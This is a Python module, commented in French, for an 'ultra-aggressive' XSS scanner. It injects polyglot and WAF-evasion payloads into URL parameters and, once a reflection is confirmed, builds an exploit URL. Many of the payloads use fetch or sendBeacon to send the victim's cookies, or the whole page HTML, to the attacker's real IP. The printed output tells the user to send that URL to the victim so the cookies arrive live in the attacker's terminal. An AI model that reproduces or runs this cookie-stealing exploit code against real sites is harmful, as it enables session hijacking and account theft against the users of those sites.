#!/usr/bin/env python3
"""
☠️ XSS POLYGLOT ULTRA-AGRESSIF — OWASP A05:2025
Vol de cookies vers IP RÉELLE de l'attaquant (pas 127.0.0.1)
Intègre tes payloads de scan_get_vuln.py + exfiltration vers IP attaquant
"""

import time
from colorama import Fore, Style
from bs4 import BeautifulSoup

class XSSPolyglot:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.attacker_url = engine.get_attacker_url()  # ← IP RÉELLE de l'attaquant
        self.aggressive = aggressive
    
    def scan(self, params):
        print(f"\n{Fore.MAGENTA}[☠️ XSS POLYGLOT ULTRA-AGRESSIF] {Style.RESET_ALL}IP attaquant: {Fore.YELLOW}{self.attacker_url}{Style.RESET_ALL}\n")
        
        # Payloads polymorphiques (tes payloads de scan_get_vuln.py + evasion WAF)
        polyglot_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            # Payloads d'exfiltration DIRECTE vers IP attaquant RÉELLE
            f"<img src=x onerror=\"fetch('{self.attacker_url}/?cookie='+btoa(document.cookie))\">",
            f"<script>fetch('{self.attacker_url}/?dump='+btoa(document.documentElement.innerHTML))</script>",
        ]
        
        if self.aggressive:
            # Mode ULTRA-AGRESSIF : payloads polymorphiques + evasion WAF
            polyglot_payloads += [
                f"<svg onload=\"navigator.sendBeacon('{self.attacker_url}/?key='+btoa(document.cookie))\">",
                f"<body onload=\"fetch('{self.attacker_url}/?cookie='+document.cookie)\">",
                f"<iframe src=\"javascript:fetch('{self.attacker_url}/?cookie='+document.cookie)\">",
                # Evasion WAF (tes payloads boostés)
                f"<img src=x onerror=\"fetch('{self.attacker_url}/?cookie='+document['cookie'])\">",
                f"<svg/onload=fetch('{self.attacker_url}/?cookie='+document.cookie)>",
                f"<svg onload=fetch('{self.attacker_url}/?cookie='+document.cookie)>",
                # Tes payloads de scan_get_vuln.py
                f"<img src=x onerror=\"fetch('{self.attacker_url}/?cookie='+document.cookie)\">",
                f"<svg/onload=alert(1)>",
                "javascript:alert(1)",
            ]
        
        baseline = self.engine.get_baseline()
        vulnerabilities = []
        
        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            
            for payload in polyglot_payloads:
                injected_url = self.engine.build_url(param, payload)
                if not injected_url:
                    continue
                
                try:
                    resp = self.engine.session.get(injected_url, timeout=5)
                    
                    if self._is_executable(resp.text, payload):
                        vuln = {
                            'type': 'xss',
                            'cwe': 'CWE-79',
                            'param': param,
                            'payload': payload,
                            'url': injected_url,
                            'evidence': 'Payload exécuté dans contexte dangereux'
                        }
                        vulnerabilities.append(vuln)
                        
                        # Générer payload d'exploitation avec IP attaquant RÉELLE
                        exploit_payload = f"<img src=x onerror=\"fetch('{self.attacker_url}/?cookie='+btoa(document.cookie))\">"
                        exploit_url = self.engine.build_url(param, exploit_payload)
                        
                        print(f"\n    {Fore.RED}[💥 XSS CONFIRMÉ] {Style.RESET_ALL}{param}")
                        print(f"      Payload: {payload[:70]}...")
                        print(f"\n    {Fore.GREEN}[🎯 PAYLOAD D'EXPLOITATION ULTRA-AGRESSIF] {Style.RESET_ALL}")
                        print(f"      URL d'attaque: {Fore.CYAN}{exploit_url}{Style.RESET_ALL}")
                        print(f"      Payload: {Fore.YELLOW}{exploit_payload}{Style.RESET_ALL}")
                        print(f"\n    {Fore.MAGENTA}[⚡ ACTION] {Style.RESET_ALL}")
                        print(f"      → Envoie cette URL à la victime")
                        print(f"      → Ses cookies arriveront DIRECTEMENT sur TA machine:")
                        print(f"        {Fore.GREEN}{self.attacker_url}{Style.RESET_ALL}")
                        print(f"      → Tu les verras apparaître EN DIRECT dans ce terminal ✅\n")
                        
                        break  # Passer au prochain paramètre après première vuln trouvée
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def _is_executable(self, html, payload):
        """Détection contexte exécutable AMÉLIORÉE - évite faux positifs"""
        
        # 🔍 ÉTAPE 1: Vérifier si c'est une erreur SQL
        sql_error_patterns = [
            'sql syntax', 'mysql error', 'pdoexception', 'sqlstate',
            'you have an error in your sql syntax', 'fatal error',
            'uncaught pdoexception', 'syntax error near'
        ]
        
        is_sql_error = any(pattern in html.lower() for pattern in sql_error_patterns)
        if is_sql_error:
            return False  # ❌ Faux positif : erreur SQL, pas XSS réel
        
        # 🔍 ÉTAPE 2: Vérifier si le HTML est une page d'erreur PHP
        php_error_patterns = [
            'fatal error', 'parse error', 'notice:', 'warning:',
            'call stack', 'stack trace', 'thrown in'
        ]
        
        is_php_error = any(pattern in html.lower() for pattern in php_error_patterns)
        if is_php_error:
            return False  # ❌ Faux positif : erreur PHP
        
        # 🔍 ÉTAPE 3: Vérifier si c'est du HTML valide (pas juste une erreur)
        if not self._is_valid_html_page(html):
            return False  # ❌ Pas une page HTML valide
        
        # ✅ ÉTAPE 4: Détection XSS réelle
        # Vérifier si le payload est dans le HTML SANS être dans une erreur
        if '<script>' in payload.lower() and '<script>' in html.lower():
            # Vérifier que le script n'est pas dans un message d'erreur
            if not self._payload_in_error_context(html, payload):
                return True
        
        # Vérifier événements JavaScript
        events = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus']
        for ev in events:
            if ev in payload.lower() and ev in html.lower():
                if not self._payload_in_error_context(html, payload):
                    return True
        
        if 'javascript:' in payload.lower() and 'javascript:' in html.lower():
            if not self._payload_in_error_context(html, payload):
                return True
        
        # Analyse DOM avec BeautifulSoup
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for tag in soup.find_all(True):
                for attr in tag.attrs:
                    if payload in str(tag[attr]) and any(e in attr.lower() for e in ['on', 'href', 'src']):
                        if not self._payload_in_error_context(html, payload):
                            return True
        except:
            pass
        
        return False
    
    def _is_valid_html_page(self, html):
        """Vérifie si c'est une page HTML valide"""
        # Indicateurs de page HTML normale
        valid_indicators = [
            '<!doctype html', '<html', '<head>', '<body>',
            'bootstrap', 'stylesheet', 'javascript', 'jquery'
        ]
        
        html_lower = html.lower()
        valid_count = sum(1 for indicator in valid_indicators if indicator in html_lower)
        
        # Doit avoir au moins 3 indicateurs pour être considéré comme valide
        return valid_count >= 3
    
    def _payload_in_error_context(self, html, payload):
        """Vérifie si le payload est dans un contexte d'erreur"""
        error_contexts = [
            'error', 'exception', 'fatal', 'warning', 'notice',
            'stack trace', 'thrown in', 'line', 'syntax error'
        ]
        
        # Chercher le payload dans le HTML
        payload_pos = html.lower().find(payload.lower())
        if payload_pos == -1:
            return False
        
        # Vérifier le contexte autour du payload (100 caractères avant/après)
        context_start = max(0, payload_pos - 100)
        context_end = min(len(html), payload_pos + len(payload) + 100)
        context = html[context_start:context_end].lower()
        
        # Si des mots d'erreur sont dans le contexte, c'est probablement un faux positif
        return any(error in context for error in error_contexts)